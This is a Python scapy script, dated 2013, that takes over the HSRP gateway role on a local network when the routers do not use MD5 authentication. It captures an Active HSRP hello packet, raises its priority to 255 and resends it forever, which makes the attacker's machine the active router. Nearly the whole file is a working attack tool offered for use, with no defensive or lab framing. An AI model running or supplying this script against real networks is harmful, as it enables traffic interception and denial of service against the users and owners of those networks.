#!/usr/bin/env python

# $Id: 20130306$
# $Date: 2013-03-06 10:27:10$
# $Author: Marek Lukaszuk$

# This takes over any HSRPv1 and v2
# communication in LAN that
# is _not_ protected by MD5 auth

# http://www.networksorcery.com/enp/protocol/hsrp.htm
# http://www.cisco.com/en/US/docs/ios/12_3t/12_3t2/feature/guide/gthsrpau.html

from scapy.all import *
import time
import sys
import hashlib
import argparse

parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
parser.add_argument('-s','--source',help='source IP address, either IPv4 or IPv6, if not set uses the corresponding interface address')
parser.add_argument('-i','--iface',default="tap0",help='interface to listen on and send packets (default tap0)')
parser.add_argument('-a','--auth',default="cisco",help='authentication data in the packet (default: cisco)') #TODO
parser.add_argument('-p','--priority',default=255,help='priority (default 255)', type=int)
parser.add_argument('-t','--hellotime',default=1,help='hello time (default 1s)', type=int)
parser.add_argument('-v','--verbose',action="store_true",help='enables scapy verbose output')

(arg,rest_argv) = parser.parse_known_args(sys.argv)

# tweak variables
IPv4Src = arg.source
IPv6Src = arg.source
interface = arg.iface
HSRPpri = arg.priority
HSRPHelloTime = arg.hellotime

# scapy verbose toggle
conf.verb = arg.verbose

# Cisco Hot Standby Router Protocol
#    Group State TLV: Type=1 Len=40
#        Version: 2
#        Op Code: Hello (0)
#        State: Active (6)
#        IP Ver.: IPv4 (4)
#        Group: 0
#        Identifier: c2:04:1a:18:00:00 (c2:04:1a:18:00:00)
#        Priority: 100
#        Hellotime: Default (3000)
#        Holdtime: Default (10000)
#        Virtual IP Address: 10.0.0.1 (10.0.0.1)
#    Text Authentication TLV: Type=3 Len=8
#        Authentication Data: Default (cisco)
#
#0000  01 00 5e 00 00 66 00 aa bb cc dd ee 08 00 45 c0   ..^..f........E.
#0010  00 50 00 00 00 00 01 11 ce 6d 0a 00 00 0a e0 00   .P.......m......
#0020  00 66 07 c1 07 c1 00 3c 97 36 01 28 02 00 06 04   .f.....<.6.(....
#0030  00 00 c2 04 1a 18 00 00 00 00 00 64 00 00 0b b8   ...........d....
#0040  00 00 27 10 0a 00 00 01 00 ff 02 00 00 00 00 00   ..'.............
#0050  00 00 00 03 03 08 63 69 73 63 6f 00 00 00         ......cisco...

hsrpv2 = "\x02"
hsrpv2active = "\x06"

# this function checks if the HSRP packet is an Active packet
def hsrpactive(pkt):
  if pkt.haslayer(HSRP):
    if pkt[HSRP].state == 16: # HSRPv0/1
      return True
    if str(pkt[HSRP])[2] == hsrpv2 and str(pkt[HSRP])[4] == hsrpv2active: # HSRPv2
      return True
  return False

print "[+] sniffing for HSRP Active packet"

# lets capture one Active HSRP status packet
p = sniff(iface = interface, count = 1, filter = "udp and port 1985", lfilter = lambda x: hsrpactive(x))[0]
print "[+] got one packet"

# now lets modify it
p[Ether].src = None

# set some values to None to
# recalculate them automatically
if p.haslayer(IP):
  p[IP].chksum = None
  p[IP].src = IPv4Src
elif p.haslayer(IPv6): # TODO - test IPv6
  p[IPv6].chksum = None
  p[IPv6].src = IPv6Src

p[UDP].chksum = None

# lets increase priority
if str(p[HSRP])[2] == hsrpv2 and str(p[HSRP])[4] == hsrpv2active:
  data = str(p[HSRP])
  # print data.encode('hex')

  off = 0
  while True:

    if off >= len(data):
      break

    if data[off] == "\x01": # HSRPv2 TLV for group
      data = data[:off+16]+chr(HSRPpri)+data[off+17:]

    if data[off] == "\x04":
      print "[-] auth HSRP using MD5, stopping"
      # TODO
      sys.exit(1)

    off += ord(data[off+1]) + 2

  # print data.encode('hex')
  p[UDP].payload = data.decode('string_escape')
else:
  if len(p[HSRP]) > 28: # HSRPv0/1 Auth
    print "[-] auth HSRP using MD5, stopping"
    # TODO
    sys.exit(1)

  p[HSRP].priority = HSRPpri

print "[+] packet modified, sending"

# and lets flood the LAN
while True:
  sendp(p, iface = interface)
  sys.stdout.write(".")
  sys.stdout.flush()
  time.sleep(HSRPHelloTime)

